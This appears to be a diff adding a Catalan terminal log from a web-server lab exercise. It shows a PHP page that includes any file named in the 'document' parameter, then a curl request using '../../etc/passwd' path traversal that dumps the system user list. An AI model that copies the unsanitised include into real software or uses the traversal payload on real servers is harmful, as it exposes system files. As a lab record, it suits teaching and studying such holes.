@@ -1,0 +1,23 @@
+oriol@ubuntu:~$ sudo cat /var/www/exercici3/index.php
+<?php
+if (isset($_GET['document'])) {
+    include('/var/www/exercici3/' . $_GET['document']);
+} else {
+    echo "<h1>Exercici 3</h1>";
+    echo "<p>Benvingut al servidor virtual d'Oriol Canillas</p>";
+    echo "<p><a href='?document=protegida/arxiu.php'>Accedir al document protegit</a></p>";
+}
+?>
+
+oriol@ubuntu:~$ curl http://exercici3.oriol.canillas.local/?document=protegida/arxiu.php
+<html><body>
+<h1>Document Protegit</h1>
+<p>Aquest document nomes hauria de ser accessible des de la xarxa interna.</p>
+<p>Usuari: oriol | Grup: professors</p>
+</body></html>
+
+oriol@ubuntu:~$ curl "http://exercici3.oriol.canillas.local/?document=../../etc/passwd"
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+oriol:x:1000:1000:Oriol Canillas,,,:/home/oriol:/bin/bash
